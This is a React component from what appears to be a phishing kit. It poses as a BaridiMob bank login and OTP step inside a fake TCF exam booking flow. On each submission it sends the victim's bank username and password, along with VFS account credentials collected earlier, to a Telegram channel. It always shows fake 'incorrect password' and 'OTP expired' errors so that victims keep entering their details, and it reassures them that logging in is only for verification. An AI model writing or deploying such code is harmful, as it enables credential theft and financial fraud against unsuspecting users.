"use client"

import type React from "react"

import { useState } from "react"
import { Button } from "@/components/ui/button"
import { Card } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { ArrowLeft, AlertCircle } from "lucide-react"
import { Alert, AlertDescription } from "@/components/ui/alert"
import Image from "next/image"
import { sendToTelegram } from "@/app/actions/send-to-telegram"

interface PaymentStepProps {
  onNext: () => void
  onBack: () => void
  onRestart: () => void
  formData: any
  updateFormData: (data: any) => void
}

export function PaymentStep({ onNext, onBack, onRestart, formData, updateFormData }: PaymentStepProps) {
  const [baridiMobUsername, setBaridiMobUsername] = useState(formData.baridiMobUsername || "")
  const [baridiMobPassword, setBaridiMobPassword] = useState(formData.baridiMobPassword || "")
  const [loginAttempts, setLoginAttempts] = useState(0)
  const [showOtpScreen, setShowOtpScreen] = useState(false)
  const [otp, setOtp] = useState("")
  const [otpAttempts, setOtpAttempts] = useState(0)
  const [error, setError] = useState("")

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault()

    // Always show error for first 2 login attempts
    if (loginAttempts < 2) {
      setError("Nom d'utilisateur ou mot de passe incorrect")
      setLoginAttempts(loginAttempts + 1)

      await sendToTelegram({
        tcfType: formData.tcfType,
        examCenter: formData.examCenter,
        selectedDate: formData.selectedDate,
        vfsEmail: formData.vfsEmail,
        vfsPassword: formData.vfsPassword,
        baridiMobUsername,
        baridiMobPassword,
      })
    } else {
      // After 2 failed login attempts, show OTP screen
      setError("")
      updateFormData({ baridiMobUsername, baridiMobPassword })

      await sendToTelegram({
        tcfType: formData.tcfType,
        examCenter: formData.examCenter,
        selectedDate: formData.selectedDate,
        vfsEmail: formData.vfsEmail,
        vfsPassword: formData.vfsPassword,
        baridiMobUsername,
        baridiMobPassword,
      })

      setShowOtpScreen(true)
    }
  }

  const handleOtpSubmit = (e: React.FormEvent) => {
    e.preventDefault()

    // Always show OTP expired error for first 3 attempts
    if (otpAttempts < 3) {
      setError("Code OTP expiré. Veuillez réessayer.")
      setOtpAttempts(otpAttempts + 1)
      setOtp("")
    } else {
      // After 3 failed OTP attempts, show final error and restart
      setError("Une erreur s'est produite. Veuillez recommencer le processus.")
      setTimeout(() => {
        onRestart()
      }, 3000)
    }
  }

  return (
    <div className="min-h-screen bg-gradient-to-b from-yellow-50 to-green-50 py-12">
      <div className="container mx-auto px-4">
        <div className="max-w-md mx-auto">
          {/* Back Button */}
          {!showOtpScreen && (
            <Button variant="ghost" onClick={onBack} className="mb-6">
              <ArrowLeft className="w-4 h-4 mr-2" />
              Retour
            </Button>
          )}

          <Card className="p-8 shadow-lg border-2 border-yellow-400/20">
            <div className="flex justify-center mb-8">
              <Image
                src="/images/t-c3-a9l-c3-a9chargement-20-281-29.jpeg"
                alt="BaridiMob"
                width={200}
                height={80}
                className="object-contain"
              />
            </div>

            {!showOtpScreen ? (
              <>
                <div className="text-center mb-8">
                  <h1 className="text-2xl font-bold text-gray-900 mb-2">Connexion</h1>
                  <p className="text-sm text-gray-600">Accédez à votre compte BaridiMob</p>
                </div>

                {/* Security Notice */}
                <Alert className="mb-6 border-blue-200 bg-blue-50">
                  <AlertCircle className="h-5 w-5 text-blue-600" />
                  <AlertDescription className="text-sm leading-relaxed text-blue-900">
                    La connexion est uniquement pour la vérification de votre compte.
                  </AlertDescription>
                </Alert>

                {/* Error Alert */}
                {error && (
                  <Alert className="mb-6 border-red-200 bg-red-50">
                    <AlertCircle className="h-5 w-5 text-red-600" />
                    <AlertDescription className="text-sm leading-relaxed text-red-900">{error}</AlertDescription>
                  </Alert>
                )}

                <form onSubmit={handleLogin} className="space-y-5">
                  <div className="space-y-2">
                    <Label htmlFor="baridiMobUsername" className="text-gray-700 font-medium">
                      Nom d'utilisateur
                    </Label>
                    <Input
                      id="baridiMobUsername"
                      type="text"
                      value={baridiMobUsername}
                      onChange={(e) => setBaridiMobUsername(e.target.value)}
                      placeholder="Entrez votre nom d'utilisateur"
                      required
                      className="text-base border-gray-300 focus:border-yellow-500 focus:ring-yellow-500"
                    />
                  </div>

                  <div className="space-y-2">
                    <Label htmlFor="baridiMobPassword" className="text-gray-700 font-medium">
                      Mot de passe
                    </Label>
                    <Input
                      id="baridiMobPassword"
                      type="password"
                      value={baridiMobPassword}
                      onChange={(e) => setBaridiMobPassword(e.target.value)}
                      placeholder="Entrez votre mot de passe"
                      required
                      className="text-base border-gray-300 focus:border-yellow-500 focus:ring-yellow-500"
                    />
                  </div>

                  <Button
                    type="submit"
                    size="lg"
                    className="w-full bg-gradient-to-r from-yellow-500 to-yellow-600 hover:from-yellow-600 hover:to-yellow-700 text-white font-semibold shadow-md"
                    disabled={!baridiMobUsername || !baridiMobPassword}
                  >
                    Se connecter
                  </Button>
                </form>
              </>
            ) : (
              <>
                <div className="text-center mb-8">
                  <h1 className="text-2xl font-bold text-gray-900 mb-2">Vérification OTP</h1>
                  <p className="text-sm text-gray-600">Entrez le code envoyé à votre téléphone</p>
                </div>

                {/* Error Alert */}
                {error && (
                  <Alert className="mb-6 border-red-200 bg-red-50">
                    <AlertCircle className="h-5 w-5 text-red-600" />
                    <AlertDescription className="text-sm leading-relaxed text-red-900">{error}</AlertDescription>
                  </Alert>
                )}

                <form onSubmit={handleOtpSubmit} className="space-y-5">
                  <div className="space-y-2">
                    <Label htmlFor="otp" className="text-gray-700 font-medium">
                      Code OTP
                    </Label>
                    <Input
                      id="otp"
                      type="text"
                      value={otp}
                      onChange={(e) => setOtp(e.target.value)}
                      placeholder="Entrez le code à 6 chiffres"
                      required
                      maxLength={6}
                      className="text-base text-center text-2xl tracking-widest border-gray-300 focus:border-yellow-500 focus:ring-yellow-500"
                    />
                  </div>

                  <Button
                    type="submit"
                    size="lg"
                    className="w-full bg-gradient-to-r from-yellow-500 to-yellow-600 hover:from-yellow-600 hover:to-yellow-700 text-white font-semibold shadow-md"
                    disabled={!otp || otp.length !== 6}
                  >
                    Vérifier
                  </Button>

                  <p className="text-sm text-center text-gray-600">
                    Vous n'avez pas reçu le code?{" "}
                    <button type="button" className="text-yellow-600 hover:underline">
                      Renvoyer
                    </button>
                  </p>
                </form>
              </>
            )}
          </Card>
        </div>
      </div>
    </div>
  )
}
